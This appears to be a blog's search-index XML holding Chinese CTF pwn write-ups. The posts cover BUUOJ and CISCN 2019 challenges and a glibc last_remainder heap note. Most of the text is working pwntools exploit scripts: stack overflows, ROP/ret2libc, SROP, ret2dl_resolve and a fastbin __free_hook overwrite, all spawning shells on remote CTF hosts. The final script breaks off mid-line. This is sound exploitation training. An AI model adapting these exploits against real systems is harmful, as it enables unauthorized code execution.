<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>第四季CTF答题赛write up</title>
      <link href="/2019/12/24/%E7%AC%AC%E5%9B%9B%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/"/>
      <url>/2019/12/24/%E7%AC%AC%E5%9B%9B%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="6b7da0549e4b3509e3ca572a7e298e2831b77c651602dda13aebdc552bbf1115"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj-&gt;pwn</title>
      <link href="/2019/12/17/buuoj-pwn/"/>
      <url>/2019/12/17/buuoj-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="0x01-rip">0x01:rip<a class="post-anchor" href="#0x01-rip"></a></h2><p><a href="http://blog.eonew.cn/archives/958" target="_blank" rel="noopener">在一些64位的glibc的payload调用system函数失败问题</a></p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sysfile_name = <span class="hljs-string">'./pwn1'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'27500'</span><span class="hljs-comment"># context.arch = 'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)<span class="hljs-comment"># p = process(file_name)</span>p = remote(ip,int(port))bin_sh_addr=<span class="hljs-number">0x40201B</span>pop_rdi=<span class="hljs-number">0x4011fb</span>payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">23</span>payload += p64(pop_rdi)payload += p64(bin_sh_addr)payload += p64(<span class="hljs-number">0x0000000000401016</span>)payload += p64(elf.symbols[<span class="hljs-string">"system"</span>])<span class="hljs-comment"># gdb.attach(p)</span>p.sendline(payload)p.interactive()</code></pre><h2 id="0x02-warmup-csaw-2016">0x02:warmup_csaw_2016<a class="post-anchor" href="#0x02-warmup-csaw-2016"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sysfile_name = <span class="hljs-string">'./warmup_csaw_2016'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'29098'</span><span class="hljs-comment"># context.arch = 'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)<span class="hljs-comment"># p = process(file_name)</span>p = remote(ip,int(port))li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)backdoor = <span class="hljs-number">0x00000000040060D</span>ret = <span class="hljs-number">0x00000000004004a1</span>p.recvuntil(<span class="hljs-string">"&gt;"</span>)<span class="hljs-comment"># gdb.attach(p)</span>p.sendline(<span class="hljs-string">"a"</span>*<span class="hljs-number">0x48</span>+p64(backdoor))p.interactive()</code></pre><h2 id="0x03-pwn1-sctf-2016">0x03:pwn1_sctf_2016<a class="post-anchor" href="#0x03-pwn1-sctf-2016"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sysfile_name = <span class="hljs-string">'./pwn1_sctf_2016'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'26620'</span><span class="hljs-comment"># context.arch = 'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)<span class="hljs-comment"># p = process(file_name)</span>p = remote(ip,int(port))li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)backdoor = <span class="hljs-number">0x08048F0D</span><span class="hljs-comment"># p.recvuntil(": ")</span><span class="hljs-comment"># gdb.attach(p)</span>p.sendline(<span class="hljs-string">"I"</span> * <span class="hljs-number">19</span> + <span class="hljs-string">"a"</span> * <span class="hljs-number">7</span> + p32(<span class="hljs-number">0x08048F0D</span>))p.interactive()</code></pre><h2 id="0x04-ciscn-2019-c-1">0x04:ciscn_2019_c_1<a class="post-anchor" href="#0x04-ciscn-2019-c-1"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-comment"># context.arch = 'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]file_name = <span class="hljs-string">'./ciscn_2019_c_1'</span>libc_name = <span class="hljs-string">'../libc/18-libc64.so'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'25405'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span>(debug == <span class="hljs-number">1</span>):p = process(file_name)elf = ELF(file_name)libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)<span class="hljs-keyword">else</span>:p = remote(ip,int(port))elf = ELF(file_name)libc = ELF(<span class="hljs-string">"../libc/18-libc64.so"</span>)li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)ret = <span class="hljs-number">0x00000000004006b9</span>rdi_ret = <span class="hljs-number">0x0000000000400c83</span>main = <span class="hljs-number">0x000000000400B28</span>p.sendlineafter(<span class="hljs-string">"choice!\n"</span>,<span class="hljs-string">"1"</span>)payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>)payload += p64(rdi_ret)+p64(elf.got[<span class="hljs-string">'__libc_start_main'</span>])+p64(elf.plt[<span class="hljs-string">'puts'</span>])+p64(main)p.sendlineafter(<span class="hljs-string">"encrypted\n"</span>,(payload))p.recvuntil(<span class="hljs-string">"@\n"</span>)addr = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))ls(<span class="hljs-string">"libc start main"</span>,addr)libc.address = addr-libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]ls(<span class="hljs-string">"libc addr"</span>,libc.address)payload = <span class="hljs-string">"a"</span>*<span class="hljs-number">0x58</span>payload +=  p64(rdi_ret)+p64(libc.search(<span class="hljs-string">"/bin/sh\x00"</span>).next())+p64(ret)+p64(libc.symbols[<span class="hljs-string">'system'</span>])p.sendlineafter(<span class="hljs-string">"choice!\n"</span>,<span class="hljs-string">"1"</span>)p.sendlineafter(<span class="hljs-string">"encrypted\n"</span>,(payload))p.interactive()</code></pre><h2 id="0x05-ciscn-2019-n-1">0x05:ciscn_2019_n_1<a class="post-anchor" href="#0x05-ciscn-2019-n-1"></a></h2><pre><code class="hljs python">sys = <span class="hljs-number">0x00004006BE</span>ret = <span class="hljs-number">0x0000000000400501</span>p.sendlineafter(<span class="hljs-string">"number."</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x38</span>+p64(sys))</code></pre><h2 id="0x06-ciscn-2019-en-2">0x06:ciscn_2019_en_2<a class="post-anchor" href="#0x06-ciscn-2019-en-2"></a></h2><p>同 ciscn_2019_c_1</p><h2 id="0x07-ciscn-2019-n-8">0x07:ciscn_2019_n_8<a class="post-anchor" href="#0x07-ciscn-2019-n-8"></a></h2><pre><code class="hljs python">payload = <span class="hljs-string">"\x11"</span> * <span class="hljs-number">0x35</span>p.sendline(payload)</code></pre><h2 id="0x08-ciscn-s-3">0x08:ciscn_s_3<a class="post-anchor" href="#0x08-ciscn-s-3"></a></h2><p>SROP</p><pre><code class="hljs python">rt_sigreturn = <span class="hljs-number">0x4004DA</span>      <span class="hljs-comment">#mov rax 15;ret</span>read_write_ret = <span class="hljs-number">0x4004F1</span>    <span class="hljs-comment">#sys_read;sys_write;ret</span>syscall = <span class="hljs-number">0x400517</span>           <span class="hljs-comment">#syscall;ret</span>payload = <span class="hljs-string">'/bin/sh\x00'</span>.ljust(<span class="hljs-number">16</span>,<span class="hljs-string">"a"</span>) + p64(read_write_ret)gdb.attach(p)raw_input(<span class="hljs-string">"#"</span>)p.send(payload)p.recv(<span class="hljs-number">32</span>)binsh_addr = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-number">-0x118</span>p.recv(<span class="hljs-number">8</span>)frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = binsh_addrframe.rsi = <span class="hljs-number">0</span>frame.rdx = <span class="hljs-number">0</span>frame.rsp = binsh_addrframe.rip = syscallraw_input(<span class="hljs-string">'#'</span>)payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(rt_sigreturn)+p64(syscall)+str(frame)p.send(payload)</code></pre><h2 id="0x09-ciscn-2019-n-3">0x09:ciscn_2019_n_3<a class="post-anchor" href="#0x09-ciscn-2019-n-3"></a></h2><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span><span class="hljs-params">(idx,typer,length,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(idx))p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(typer))<span class="hljs-keyword">if</span> typer == <span class="hljs-number">1</span>:p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(content))<span class="hljs-keyword">else</span>:p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(length))p.recvuntil(<span class="hljs-string">"&gt; "</span>)<span class="hljs-keyword">if</span> len(content) == length<span class="hljs-number">-1</span>:p.send(content)<span class="hljs-keyword">else</span>:p.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(<span class="hljs-number">2</span>))p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(<span class="hljs-number">3</span>))p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(idx))new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">"a"</span>)new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>,<span class="hljs-string">"a"</span>)new(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)new(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0xc</span>,<span class="hljs-string">'bash'</span>+p32(elf.plt[<span class="hljs-string">'system'</span>]))new(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>,<span class="hljs-string">"/bin/sh\x00"</span>)free(<span class="hljs-number">1</span>)gdb.attach(p)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2019国赛线上赛wp</title>
      <link href="/2019/12/14/2019%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9Bwp/"/>
      <url>/2019/12/14/2019%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>好久没有复现题目了，利用复习周和寒假复现一下这一年的题目</p></blockquote><h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="baby-pwn">baby_pwn<a class="post-anchor" href="#baby-pwn"></a></h2><pre><code class="hljs c"><span class="hljs-keyword">ssize_t</span> vuln()&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-28h]</span>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>u);&#125;</code></pre><p>程序只有一个 read 函数</p><p>程序只开启了 NX 保护</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> roputils <span class="hljs-keyword">import</span> *fpath = <span class="hljs-string">'./pwn'</span>offset = <span class="hljs-number">44</span>rop = ROP(fpath)addr_bss = rop.section(<span class="hljs-string">'.bss'</span>)buf = rop.retfill(offset)buf += rop.call(<span class="hljs-string">'read'</span>, <span class="hljs-number">0</span>, addr_bss, <span class="hljs-number">100</span>)buf += rop.dl_resolve_call(addr_bss+<span class="hljs-number">20</span>, addr_bss)p = Proc(rop.fpath)p.write(p32(len(buf)) + buf)<span class="hljs-keyword">print</span> <span class="hljs-string">"[+] read: %r"</span> % (buf)buf = rop.string(<span class="hljs-string">'/bin/sh'</span>)buf += rop.fill(<span class="hljs-number">20</span>, buf)buf += rop.dl_resolve_data(addr_bss+<span class="hljs-number">20</span>, <span class="hljs-string">'system'</span>)buf += rop.fill(<span class="hljs-number">100</span>, buf)p.write(buf)p.interact(<span class="hljs-number">0</span>)</code></pre><h2 id="daily">daily<a class="post-anchor" href="#daily"></a></h2><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"============================"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"Daily choice"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"============================"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"1.show the daily"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"2.add a new pages"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"3.change the things in the daily"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"4.remove the things in the daily"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"5.exit"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"============================"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice:"</span>);<span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v0;</code></pre><p>菜单题目</p><pre><code class="hljs bash">➜  daily checksec pwn[*] <span class="hljs-string">'/ctf/CTF-platform/windows/2019/guosai/pwn/daily/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p><strong>free函数</strong></p><pre><code class="hljs c"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">sub_400BA9</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-keyword">if</span> ( dword_602040 )  &#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of daily:"</span>);    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>LL);    v1 = atoi(&amp;buf);    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;dword_602060[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>] )    &#123;      <span class="hljs-built_in">free</span>(*(<span class="hljs-keyword">void</span> **)&amp;dword_602060[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>]);      *(_QWORD *)&amp;dword_602060[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>] = <span class="hljs-number">0L</span>L;      dword_602060[<span class="hljs-number">4</span> * v1] = <span class="hljs-number">0</span>;      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"remove successful!!"</span>);      --dword_602040;    &#125;    <span class="hljs-keyword">else</span>    &#123;      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);    &#125;  &#125;  <span class="hljs-keyword">else</span>  &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No pages in the daily"</span>);  &#125;  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;&#125;</code></pre><p>没有对 v1 检查，造成任意地址free</p><p>通过任意地址free，直接free堆头地址，再利用bss留存的堆块指针进行UAF操作。</p><ol><li>正常利用unsort bin进行堆基址和libc基址的leak。</li><li>利用任意地址free，直接将布置好的堆块free到fastbin中。</li><li>利用bss段留存的该堆块指针，进行fastbin attack，将bss段当作堆块申请。</li><li>通过申请到的bss段堆块，将其余堆块指针覆盖为free_hook地址，并通过edit被覆盖的堆块索引将free_hook写为system地址。</li><li>通过free之前布置好的data为’/bin/sh\x00’的对应Header来get shell。</li></ol><p>(double free 也可以)</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span>file_name = <span class="hljs-string">'./pwn'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'108.160.139.79'</span>port = <span class="hljs-string">'9090'</span><span class="hljs-comment"># context.arch = 'amd64'</span><span class="hljs-comment"># context.log_level='debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)p = process(file_name)<span class="hljs-comment"># p = remote(ip,int(port))</span>li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,<span class="hljs-string">"1"</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,<span class="hljs-string">"2"</span>)p.sendlineafter(<span class="hljs-string">"daily:"</span>,str(size))p.sendlineafter(<span class="hljs-string">"daily\n"</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,<span class="hljs-string">"3"</span>)p.sendlineafter(<span class="hljs-string">"daily:"</span>,str(idx))p.sendlineafter(<span class="hljs-string">"daily\n"</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,<span class="hljs-string">"4"</span>)p.sendlineafter(<span class="hljs-string">"daily:"</span>,str(idx))add(<span class="hljs-number">0x80</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#1</span>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#3</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0x80</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#0</span>show()p.recvuntil(<span class="hljs-string">"0 : "</span>)libc.address = u64(p.recvuntil(<span class="hljs-string">"1"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-3951370</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)edit(<span class="hljs-number">0</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>)show()p.recvuntil(<span class="hljs-string">"aaaaaaaa"</span>)heap_base = u64(p.recvuntil(<span class="hljs-string">"1"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>)) - <span class="hljs-number">0x10a</span>ls(<span class="hljs-string">"heap addr"</span>,heap_base)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">3</span>)add(<span class="hljs-number">0x30</span> , <span class="hljs-string">'a'</span> * <span class="hljs-number">8</span> + p64(heap_base + <span class="hljs-number">0x10</span>)) <span class="hljs-comment">#0</span>offset = (heap_base - <span class="hljs-number">0x602060</span>) / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>li(<span class="hljs-string">"offset"</span>,offset)free(offset)add(<span class="hljs-number">0x41</span> , <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x40</span>) <span class="hljs-comment">#1</span>edit(<span class="hljs-number">0</span> , p64(<span class="hljs-number">0x602068</span>))add(<span class="hljs-number">0x30</span>,<span class="hljs-string">"/bin/sh\x00"</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x30</span>,p64(libc.symbols[<span class="hljs-string">'__free_hook'</span>]))edit(<span class="hljs-number">1</span>,p64(libc.symbols[<span class="hljs-string">'system'</span>]))free(<span class="hljs-number">0</span>)<span class="hljs-comment"># gdb.attach(p)</span>p.interactive()</code></pre><h2 id="your-pwn">your_pwn<a class="post-anchor" href="#your-pwn"></a></h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>last_remainder</title>
      <link href="/2019/12/12/last-remainder/"/>
      <url>/2019/12/12/last-remainder/</url>
      
        <content type="html"><![CDATA[<p>切割unsortedbin中的大chunk时：<br>当unsortedbin有对应的freechunk可以给malloc切割使用时，unsortedbin会发生以下步骤：</p><ol><li>先将这些freechunk放置到对应大小的bins链上（放入smallbin或largebin）</li><li>放置到对应的bins链上之后，切割此freechunk</li><li>切割之后会产生last remainder，再将last remainder放到unsortedbin上<blockquote><p>例如：<br>此时，unsortedbin有两个0x800的freechunk<br>此时申请一个0x600的chunk<br>那么unsortedbin会先consolidate，把两个0x800的freechunk先移动到largebin中<br>然后再切割largebin的freechunk，将切割后余留下的0x200放入unsortedbin</p></blockquote></li></ol><p>切割smallbins、largebins中的大chunk时：</p><ol><li>切割smallbins或者largebins中的大freechunk，产生last remainder</li><li>将last remainder放入到unsortedbin中<br>注意（重点）：malloc永远不会去检测切割fastbins（详情见_int_malloc函数的执行顺序）</li></ol><p>这里需要使用一种不需要伪造prevsize来构造overlap的技巧。当申请chunk时，若chunk是从last_remainder上切割下来，那么这个过程中将不会调用到unlink宏，也就不会检测下一chunk的prevsize是否等于当前chunk的size，这样就可以实现无prevsize触发overlap。</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> requests<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span>file_name = <span class="hljs-string">'./pwn1'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'26364'</span>context.arch = <span class="hljs-string">'amd64'</span><span class="hljs-comment"># context.log_level='debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)p = process(file_name)li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)<span class="hljs-string">'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"length&gt; "</span>,str(size))p.sendlineafter(<span class="hljs-string">"content&gt; "</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">2</span>))p.sendlineafter(<span class="hljs-string">"index&gt; "</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">3</span>))p.sendlineafter(<span class="hljs-string">"index&gt; "</span>,str(idx))fkchunk = <span class="hljs-string">"/bin/sh||aaaaaaa\x31"</span>p.sendlineafter(<span class="hljs-string">"name&gt; "</span>,fkchunk)add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#A 0</span>add(<span class="hljs-number">0x1f8</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B 1</span>add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#C 2</span>free(<span class="hljs-number">1</span>)free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#A 0</span>add(<span class="hljs-number">0x78</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B1 1</span>add(<span class="hljs-number">0x108</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B2 3</span>add(<span class="hljs-number">0x8</span>,  <span class="hljs-string">""</span>) <span class="hljs-comment">#B3 4</span>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B4 5</span>free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0x78</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B1 1</span>add(<span class="hljs-number">0x108</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B2 2</span>add(<span class="hljs-number">0x8</span>,  <span class="hljs-string">""</span>) <span class="hljs-comment">#B3 6</span>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B4 7</span>add(<span class="hljs-number">0x10</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#8</span>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#9</span><span class="hljs-comment"># add(0x18, "")</span>free(<span class="hljs-number">3</span>)show(<span class="hljs-number">2</span>)libc.address = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span 